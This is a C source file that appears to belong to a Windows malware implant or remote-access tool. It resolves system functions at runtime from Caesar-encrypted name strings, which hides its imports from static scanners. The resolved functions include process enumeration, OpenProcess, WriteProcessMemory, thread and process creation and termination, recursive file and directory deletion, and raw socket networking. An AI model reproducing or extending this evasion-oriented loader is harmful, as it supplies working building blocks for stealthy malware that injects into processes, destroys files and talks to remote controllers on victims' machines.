#include "resolve_apis.h"

API Api;
HMODULE hWininet;
HMODULE hMsvcrt;
HMODULE hKernel32;

void InitApis() {
	// Dynamic loading functions
	hKernel32 = LoadLibraryA(CAESAR_DECRYPT("pjwsjq873iqq")); //kernel32.dll
	if (!hKernel32) {
		return;
	}

	Api.GetProcAddress = (TGetProcAddress)GetProcAddress(hKernel32, CAESAR_DECRYPT("LjyUwthFiiwjxx"));
	Api.CreateFileW = (TCreateFileW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjKnqj\\"));
	Api.ReadFile = (TReadFile)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("WjfiKnqj"));
	Api.WriteFile = (TWriteFile)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("\\wnyjKnqj"));
	Api.CloseHandle = (TCloseHandle)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HqtxjMfsiqj"));
	Api.GetLastError = (TGetLastError)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("LjyQfxyJwwtw"));
	Api.CreatePipe = (TCreatePipe)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjUnuj"));
	Api.WaitForSingleObject = (TWaitForSingleObject)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("\\fnyKtwXnslqjTgojhy"));
	Api.Sleep = (TSleep)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("Xqjju"));
	Api.CreateThread = (TCreateThread)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjYmwjfi"));
	Api.TerminateThread = (TTerminateThread)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("YjwrnsfyjYmwjfi"));
	Api.CreateProcessW = (TCreateProcessW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjUwthjxx\\"));
	Api.TerminateProcess = (TTerminateProcess)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("YjwrnsfyjUwthjxx"));
	Api.FreeLibrary = (TFreeLibrary)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("KwjjQngwfw~"));
	Api.FindClose = (TFindClose)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("KnsiHqtxj"));
	Api.GetLogicalDrives = (TGetLogicalDrives)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("LjyQtlnhfqIwn{jx"));
	Api.MultiByteToWideChar = (TMultiByteToWideChar)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("RzqynG~yjYt\\nijHmfw"));
	Api.FindFirstFileW = (TFindFirstFileW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("KnsiKnwxyKnqj\\"));
	Api.FindNextFileW = (TFindNextFileW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("KnsiSj}yKnqj\\"));
	Api.RemoveDirectoryW = (TRemoveDirectoryW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("Wjrt{jInwjhytw~\\"));
	Api.DeleteFileW = (TDeleteFileW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("IjqjyjKnqj\\"));
	Api.lstrcpyW = (TlstrcpyW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("qxywhu~\\"));
	Api.lstrcatW = (TlstrcatW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("qxywhfy\\"));
	Api.CreateToolhelp32Snapshot = (TCreateToolhelp32Snapshot)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjYttqmjqu87Xsfuxmty"));
	Api.Process32FirstW = (TProcess32FirstW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("Uwthjxx87Knwxy\\"));
	Api.OpenProcess = (TOpenProcess)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("TujsUwthjxx"));
	Api.Process32NextW = (TProcess32NextW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("Uwthjxx87Sj}y\\"));
	Api.IsWow64Process = (TIsWow64Process)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("Nx\\t|;9Uwthjxx"));
	Api.WriteProcessMemory = (TWriteProcessMemory)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("\\wnyjUwthjxxRjrtw~"));

	hMsvcrt = LoadLibraryA(CAESAR_DECRYPT("rx{hwy3iqq"));
	if (!hMsvcrt) {
		return;
	}

	Api.strcpy = (Tstrcpy)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("xywhu~"));
	Api.malloc = (Tmalloc)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("rfqqth"));
	Api.free = (Tfree)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("kwjj"));
	Api.strncmp = (Tstrncmp)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("xywshru"));
	Api.mbstowcs = (Tmbstowcs)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("rgxyt|hx"));
	Api.memset = (Tmemset)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("rjrxjy"));
	Api.remove = (Tremove)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("wjrt{j"));
	Api.rmdir = (Tremove)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("dwrinw"));
	Api.stat = (Tstat)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("dxyfy"));
	Api.sprintf = (Tsprintf)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("xuwnsyk"));
	Api.realloc = (Trealloc)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("wjfqqth"));
	Api.wcstombs = (Twcstombs)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("|hxytrgx"));
	Api.localtime = (Tlocaltime)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("qthfqynrj"));
	Api.strftime = (Tstrftime)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("xywkynrj"));
	Api._snprintf = (T_snprintf)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("dxsuwnsyk"));
	Api.fopen = (Tfopen)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("ktujs"));
	Api.fclose = (Tfclose)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("khqtxj"));
	Api.fread = (Tfread)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("kwjfi"));
	Api.fwrite = (Tfwrite)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("k|wnyj"));
	Api.wcscmp = (Twcscmp)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("|hxhru"));

	hWininet = LoadLibraryA(CAESAR_DECRYPT("|x7d873iqq"));
	if (!hWininet) {
		return;
	}

	Api.connect = (Tconnect)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("htssjhy"));
	Api.socket = (Tsocket)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("xthpjy"));
	Api.send = (Tsend)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("xjsi"));
	Api.recv = (Trecv)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("wjh{"));
	Api.closesocket = (Tclosesocket)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("hqtxjxthpjy"));
	Api.htons = (Thtons)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("mytsx"));
	Api.inet_addr = (Tinet_addr)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("nsjydfiiw"));
	Api.WSAStartup = (TWSAStartup)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("\\XFXyfwyzu"));
	Api.WSAGetLastError = (TWSAGetLastError)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("\\XFLjyQfxyJwwtw"));
	Api.select = (Tselect)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("xjqjhy"));
	Api.setsockopt = (Tsetsockopt)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("xjyxthptuy"));
}
/* Never called
void FreeApis() {
	Api.FreeLibrary(hWininet);
	Api.FreeLibrary(hMsvcrt);
	Api.FreeLibrary(hKernel32);
}
*/